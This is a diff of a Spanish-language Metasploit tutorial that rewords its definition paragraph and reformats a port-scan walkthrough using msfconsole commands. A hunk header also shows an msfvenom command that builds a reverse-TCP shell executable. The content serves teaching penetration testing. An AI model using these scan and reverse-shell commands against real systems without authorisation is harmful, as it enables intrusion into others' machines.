@@ -16,9 +16,9 @@ author: Conde
 
 ### Definición
 Metasploit es un proyecto de **código abierto** para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad
-y ayuda en tests de penetración "Pentesting". Para usar esta herramienta no necesitas tener conocimientos de lo que hace, ya que te lo dan 
-**todo automatizado**, de forma que solo hay que hacer unos pequeños ajustes. En mi opinión no me gust utilizarlo, pero un hacker, debe saber 
-utilizar todas las herramientas posibles, por si algún día le es necesario. 
+y ayuda en **Pentesting**. Para usar esta herramienta no necesitas tener conocimientos de lo que hace, ya que te lo dan **todo automatizado**, de 
+forma que solo hay que hacer unos pequeños ajustes. En mi opinión no me gust utilizarlo, pero un hacker, debe saber utilizar todas las herramientas 
+posibles, por si algún día le es necesario. 
 
 ### Conceptos 
 Antes de utilizarlo, es importante tener unos conceptos claros, estos son: 
@@ -94,37 +94,27 @@ msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888 -f exe -o s
 
 #### Ejemplo
 Ahora veremos un ejemplo de uso de metasploit, para realizar un escaneo de puertos. 
-
 1. Comezamos lanzando metasploit 
-
 ```bash
 msfconsole
 ```
 2. Buscamos el exploit relacionado 
-
 ```bash
 search portscan 
 ```
 3. Usamos el exploit que escogamos 
-
 ```bash
 use /auxiliary/scanner/portscan/tcp 
 ```
-
 4. Vemos las opciones del exploit 
-
 ```bash
 show options 
 ```
-
 5. Configuramos las variables necesarios (Yes)
-
 ```bash
 set rhosts 192.168.20.123 
 ```
-
 6. Lo lanzamos 
-
 ```bash
 exploit 
 ```
